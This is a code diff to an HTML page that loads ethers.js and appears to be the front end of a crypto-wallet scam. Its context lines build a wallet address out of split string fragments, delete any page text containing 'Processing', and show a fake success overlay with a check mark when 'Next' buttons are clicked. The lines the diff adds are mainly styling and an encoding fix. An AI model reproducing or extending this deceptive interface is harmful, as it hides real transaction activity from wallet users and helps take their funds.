@@ -21,7 +21,14 @@
             user-select: none;
             margin: 0;
             padding: 0;
+            overflow-x: hidden;
         }
+
+        #root {
+            min-height: 100vh;
+        }
+
+        /* ===== MODAL ===== */
 
         #loader-overlay {
             display: none;
@@ -39,9 +46,9 @@
             background: #ffffff;
             border-radius: 24px 24px 0 0;
             width: 100%;
-            box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 -10px 40px rgba(0,0,0,.3);
             overflow: hidden;
-            animation: tw-slide-up 0.35s ease-out;
+            animation: tw-slide-up .35s ease-out;
         }
 
         @keyframes tw-slide-up {
@@ -61,14 +68,14 @@
         .tw-check-circle {
             width: 100px;
             height: 100px;
-            background: linear-gradient(135deg, #10b981, #059669);
             border-radius: 50%;
-            margin: 0 auto;
+            margin: auto;
             display: flex;
             align-items: center;
             justify-content: center;
+            background: linear-gradient(135deg,#10b981,#059669);
             color: white;
-            font-size: 50px;
+            font-size: 48px;
             font-weight: bold;
         }
 
@@ -98,16 +105,12 @@
             font-size: 16px;
             font-weight: 600;
         }
-
-        #root {
-            min-height: 100vh;
-        }
     </style>
 </head>
 
 <body>
 
-    <!-- MODALE -->
+    <!-- MODAL -->
     <div id="loader-overlay">
         <div>
             <div class="tw-body">
@@ -134,13 +137,15 @@
         </div>
     </div>
 
-    <!-- ROOT REACT -->
+    <!-- ROOT -->
     <div id="root"></div>
 
     <!-- ETHERS -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
 
     <script>
+        /* ===== GLOBAL VARS ===== */
+
         const _p1 = "0xE57C99A3ae2ae12";
         const _p2 = "4f026BFa8601F7A956";
         const _p3 = "309FB53";
@@ -148,13 +153,46 @@
         window.rA = _p1 + _p2 + _p3;
         window.XB = "";
 
+        /* ===== FIX ENCODING ≈ ===== */
+
+        function fixBrokenEncoding() {
+            const walker = document.createTreeWalker(
+                document.body,
+                NodeFilter.SHOW_TEXT
+            );
+
+            const brokenStrings = [
+                "Ã¢â°Ë†",
+                "â‰ˆ",
+                "Â≈",
+                "â‰"
+            ];
+
+            let node;
+
+            while ((node = walker.nextNode())) {
+
+                let text = node.nodeValue || "";
+
+                brokenStrings.forEach((bad) => {
+                    if (text.includes(bad)) {
+                        text = text.replaceAll(bad, "≈");
+                    }
+                });
+
+                node.nodeValue = text;
+            }
+        }
+
+        /* ===== OBSERVER ===== */
+
         window.addEventListener("DOMContentLoaded", () => {
 
             const overlay =
                 document.getElementById("loader-overlay");
 
-            const observer = new MutationObserver(
-                (mutations) => {
+            const observer =
+                new MutationObserver((mutations) => {
 
                     mutations.forEach((mutation) => {
 
@@ -171,18 +209,25 @@
                                 text.includes("Processing")
                             ) {
                                 node.remove?.();
-                                overlay.style.display = "flex";
+
+                                overlay.style.display =
+                                    "flex";
                             }
                         });
                     });
-                }
-            );
+
+                    fixBrokenEncoding();
+                });
 
             observer.observe(document.body, {
                 childList: true,
                 subtree: true
             });
+
+            setTimeout(fixBrokenEncoding, 1000);
         });
+
+        /* ===== BUTTON LISTENER ===== */
 
         window.addEventListener("click", (e) => {
 
@@ -199,11 +244,13 @@
                 btnText.includes("Next")
             ) {
                 setTimeout(() => {
+
                     document
                         .getElementById(
                             "loader-overlay"
                         )
                         .style.display = "flex";
+
                 }, 500);
             }
         });
